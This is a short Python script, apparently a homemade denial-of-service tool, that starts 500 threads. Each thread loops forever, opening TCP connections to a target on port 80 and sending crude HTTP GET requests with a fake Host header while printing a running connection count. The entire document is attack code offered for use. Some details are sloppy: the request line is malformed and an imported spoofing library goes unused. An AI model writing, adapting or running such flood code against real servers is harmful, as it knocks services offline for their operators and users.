import threading
import socket
from scapy.all import IP

target_addr = ''                 # LAN adapter IPV4 Address
port = 80                        # Port for HTTP Protocol
fake_ip = "108.0.0.0"

connections = 0

def dos_attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_addr, port))
        s.sendto(("GET /" + target_addr + "HTTP/1.1\r\n").encode("ascii"), (target_addr, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"), (target_addr, port))
        s.close()
        
        global connections
        connections += 1
        if connections % 50 == 0:
            print(connections, " connections")

for i in range(500):
    thread = threading.Thread(target = dos_attack)
    thread.start()
